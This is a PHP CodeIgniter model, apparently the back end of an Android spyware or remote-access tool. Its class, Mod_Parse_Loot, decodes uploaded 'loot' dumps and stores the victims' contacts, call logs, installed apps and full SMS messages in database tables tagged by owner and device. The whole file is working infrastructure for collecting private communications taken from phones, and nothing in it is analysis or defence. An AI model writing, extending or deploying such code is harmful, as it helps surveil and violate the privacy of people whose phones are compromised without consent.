<?php

namespace App\Models;

use CodeIgniter\Model;


class Mod_Parse_Loot extends Model{

    public function get_contacts($file_name,$var_file_owner, $var_file_print){
        $model_crypt = new Mod_Crypt();
        $model_android = new Mod_Android();
        $dated = date('Y-m-d H:i:s');

        $loot_data = file_get_contents(WRITEPATH. 'uploads/text_dump/'.$file_name);
        $loot_decoded = $model_crypt->decode_content($loot_data);

        $data_dump1 = str_replace("-------------------------", "", $loot_decoded);
        $data_dump2 = substr($data_dump1, 13, -2);
        $data_dump3 = str_replace("},{", "}|||{", $data_dump2);
        $data_dump4 = explode("|||", $data_dump3);

        foreach ($data_dump4 as $contacts) {
            $vars = json_decode($contacts, true);

            $contact_update_date = date('Y-m-d H:i:s a', substr($vars["Updated"], 0, -3));

            $data = array(
                'Name' => $vars["Name"],
                //'Number' => $vars["Number"],
                'Number' => $model_android->contacts_trim_number_length($vars["Number"]),
                'ID' => $vars["ID"],
                'Updated' => $contact_update_date,
                'meta_Inserted' => $dated,
                'meta_Opened' => '0',
                'meta_Viewed' => '0',
                'meta_Owner' => $var_file_owner,
                'meta_Print' => $var_file_print,
            );

            $data_check = array(
                'Number' => $vars["Number"]
                //'ID' => $var_id
            );

            $builder = $this->db->table('tbl_Contacts');
            $query_sent = $builder->where($data_check)->get();
            $query_check = $query_sent->getResultArray();

            if (count($query_check) > 0 ){
            } else {
                $builder = $this->db->table('tbl_Contacts');
                $builder->insert($data);
            }
        }
    }

    public function get_logs($file_name,$var_file_owner, $var_file_print){
        $model_crypt = new Mod_Crypt();
        $model_android = new Mod_Android();
        $dated = date('Y-m-d H:i:s');

        $loot_data = file_get_contents(WRITEPATH. 'uploads/text_dump/'.$file_name);
        $loot_decoded = $model_crypt->decode_content($loot_data);

        $data_dump1 = str_replace("---------------------------------", "", $loot_decoded);
        $data_dump2 = substr($data_dump1, 15, -2);
        $data_dump3 = str_replace("},{", "}|||{", $data_dump2);
        $data_dump4 = explode("|||", $data_dump3);

        foreach ($data_dump4 as $calls) {
            $data = json_encode($calls);
            $data1 = json_decode($data);
            $data2 = json_decode($data1);

            $call_date = date('Y-m-d H:i:s a', substr($data2->Date, 0, -3));

            $data_check = array(
                'Caller' => $data2->Caller,
                'Type' => $data2->Type,
                'Timestamp' => $call_date,
                'Durations' => $data2->Duration
            );

            $data = array(
                'Saved' => $data2->Saved,
                //'Caller' => $data2->Caller,
                'Caller' => $model_android->contacts_trim_number_length($data2->Caller),
                'Type' => $data2->Type,
                'Timestamp' => $call_date,
                'Durations' => $data2->Duration,
                'meta_Inserted' => $dated,
                'meta_Opened' => '0',
                'meta_Viewed' => '0',
                'meta_Owner' => $var_file_owner,
                'meta_Print' => $var_file_print
            );

            $builder = $this->db->table('tbl_Logs');
            $query_sent = $builder->where($data_check)->get();
            $query_check = $query_sent->getResultArray();

            if (count($query_check) > 0 ){
            } else {
                $builder = $this->db->table('tbl_Logs');
                $builder->insert($data);
            }
        }
    }

    public function get_apps($file_name,$var_file_owner, $var_file_print){
        $model_crypt = new Mod_Crypt();
        $dated = date('Y-m-d H:i:s');

        $loot_data = file_get_contents(WRITEPATH. 'uploads/text_dump/'.$file_name);
        $loot_decoded = $model_crypt->decode_content($loot_data);

        $data_dump1 = str_replace("ApplicationInfo", "", $loot_decoded);
        $data_dump2 = str_replace("}]", "}]\n", $data_dump1);
        $data_dump3 = explode("\n", $data_dump2);

        $data = json_encode($data_dump3[0]);
        $data1 = json_decode($data);

        $data10 = str_replace("[{", "", $data1);
        $data11 = str_replace("{", "", $data10);
        $data12 = str_replace("}", "", $data11);
        $data13 = str_replace("]", "", $data12);
        $data2 = explode(",", $data13);

        $data3 = substr($data_dump3[1], 0, -3);
        $data4 = explode("|||", $data3);

        $data5 = array_combine($data2, $data4);

        foreach ($data5 as $appdata=>$appname) {
            $appinfo = explode(" ", trim($appdata));
            $appcode = $appinfo[0];
            $apppackage = $appinfo[1];

            $data_check = array(
                'Package' => $apppackage,
                'Name' => $appname
            );

            $data = array(
                'Code' => $appcode,
                'Package' => $apppackage,
                'Name' => $appname,
                'meta_Inserted' => $dated,
                'meta_Opened' => '0',
                'meta_Viewed' => '0',
                'meta_Owner' => $var_file_owner,
                'meta_Print' => $var_file_print
            );

            $builder = $this->db->table('tbl_Apps');
            $query_sent = $builder->where($data_check)->get();
            $query_check = $query_sent->getResultArray();

            if (count($query_check) > 0 ){
            } else {
                $builder = $this->db->table('tbl_Apps');
                $builder->insert($data);
            }
        }
    }

    public function get_sms($file_name, $var_file_owner, $var_file_print){
        $model_crypt = new Mod_Crypt();
        $model_android = new Mod_Android();
        $dated = date('Y-m-d H:i:s');

        $loot_data = file_get_contents(WRITEPATH. 'uploads/text_dump/'.$file_name);
        $loot_decoded = $model_crypt->decode_content($loot_data);


        $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
        $data_dump2 = str_replace("\n", '****', $data_dump1);
        $data_dump3 = str_replace('****"', '"', $data_dump2);
        $data_dump4 = "[".substr($data_dump3, 0, -2)."}]";

        $data = json_encode($data_dump4);
        $data1 = json_decode($data);
        $data2 = json_decode($data1);

        foreach ($data2 as $smsdata) {

            $sms_date = date('Y-m-d H:i:s a', substr($smsdata->Date, 0, -3));

            $thread_id = 'Thread Id';
            $data_check = array(
                'sms_type' => $smsdata->Type,
                //'sms_number' => $smsdata->Number,
                'sms_number' => $model_android->contacts_trim_number_length($smsdata->Number),
                //'sms_time' => $smsdata->Date,
                'sms_time' => $sms_date,
                'sms_seen' => $smsdata->Seen,
                'sms_body' => $smsdata->Body
            );

            $data = array(
                'sms_type' => $smsdata->Type,
                'sms_number' => $smsdata->Number,
                'sms_thread_id' => $smsdata->$thread_id,
                'sms_time' => $sms_date,
                'sms_seen' => $smsdata->Seen,
                'sms__id' => $smsdata->ID,
                'sms_body' => $smsdata->Body,
                'meta_uploaded' => $dated,
                'meta_seen' => '0',
                'meta_owner' => $var_file_owner,
                'meta_Print' => $var_file_print,
            );

            $builder = $this->db->table('tbl_Sms');
            $query_sent = $builder->where($data_check)->get();
            $query_check = $query_sent->getResultArray();

            if (count($query_check) > 0 ){
            } else {
                $builder = $this->db->table('tbl_Sms');
                $builder->insert($data);
            }
        }
    }
}
